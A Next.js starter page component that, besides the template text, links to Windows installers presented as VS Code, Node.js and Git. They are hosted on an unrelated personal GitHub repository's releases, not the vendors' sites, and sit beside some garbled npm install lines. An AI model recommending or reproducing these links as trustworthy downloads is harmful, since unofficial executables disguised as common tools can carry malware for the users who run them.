import { Button } from "@/components/ui/button"
import Link from "next/link"

export default function Page() {
  return (
    <div className="flex min-h-svh p-6">
      <div className="flex max-w-md min-w-0 flex-col gap-4 text-sm leading-loose">
        <div>
          <h1 className="font-medium">Project ready!</h1>
          <p>You may now add components and start building.</p>
          <p>We&apos;ve already added the button component for you.</p>
          <Link href={"/index.html"}>HTML</Link>
          <div className="flex flex-col">
            <Link
              href={
                "https://github.com/developerplus2026/nextjs-app/releases/download/Lastest/VSCodeUserSetup-x64-1.145.0-insider.exe"
              }
            >
              https://github.com/developerplus2026/nextjs-app/releases/download/Lastest/VSCodeUserSetup-x64-1.145.0-insider.exe
            </Link>{" "}
            <Link
              href={
                "https://github.com/developerplus2026/nextjs-app/releases/download/Lastest/node-v26.13.0-x64.msi"
              }
            >
              https://github.com/developerplus2026/nextjs-app/releases/download/Lastest/node-v26.13.0-x64.msi
            </Link>
            <Link
              href={
                "https://github.com/developerplus2026/nextjs-app/releases/download/Lastest/Git-2.56.0.4-64-bit.exe"
              }
            >
             https://github.com/developerplus2026/nextjs-app/releases/download/Lastest/Git-2.56.0.4-64-bit.exe
            </Link>
            <Link href={"https://github.com/developerplus2026/nextjs-app.git"}>
              https://github.com/developerplus2026/nextjs-app.git
            </Link>
            <p>npm install -g </p> <p>npm npm install</p>{" "}
            <p> npm install -g live-server </p>
          </div>
        </div>
        <div className="font-mono text-xs text-muted-foreground">
          (Press <kbd>d</kbd> to toggle dark mode)
        </div>
      </div>
    </div>
  )
}
